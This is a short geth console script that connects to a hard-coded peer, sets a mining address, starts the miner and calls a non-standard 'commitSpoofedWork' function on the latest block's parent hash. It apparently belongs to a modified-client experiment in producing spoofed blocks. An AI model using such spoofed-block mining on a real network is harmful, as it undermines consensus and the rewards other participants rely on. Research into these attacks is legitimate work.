///////////////////////////////////////////////////////////////////////////////
// HYPER PARAMETERS                                                          //
///////////////////////////////////////////////////////////////////////////////
DEBUG = false


///////////////////////////////////////////////////////////////////////////////
// Script                                                                    //
///////////////////////////////////////////////////////////////////////////////
admin.addPeer("enode://cb1aa2d0aa1afbae08d582be88f11fbb0feb4b9c90aa5613e4de55b4a388514d120408ee2533739bee9034eae3cd5a5757a7e52733d1c0822226fc1ec0ac8f90@134.60.77.152:30303")
console.log('[INFO]\t', 'peer added')

miner.setEtherbase("0x638354c050c08730562118dea9c62edc89d2a1e9")
console.log('[INFO]\t', 'etherbase set')

miner.justStart(1)
console.log('[INFO]\t', 'miner started')

head = eth.getBlock("latest")
console.log('[INFO]\t', 'head retrived\t', 'block number:', head.number)

result = miner.commitSpoofedWork(head.parentHash, head.timestamp)
console.log('[INFO]\t', 'spoof mined\t', 'block hash:', result)

if(DEBUG){
    block = eth.getBlock(result)
    console.log('[DEBUG]\t', 'mined block details:')
    console.log(JSON.stringify(block, null, "    "))    
}
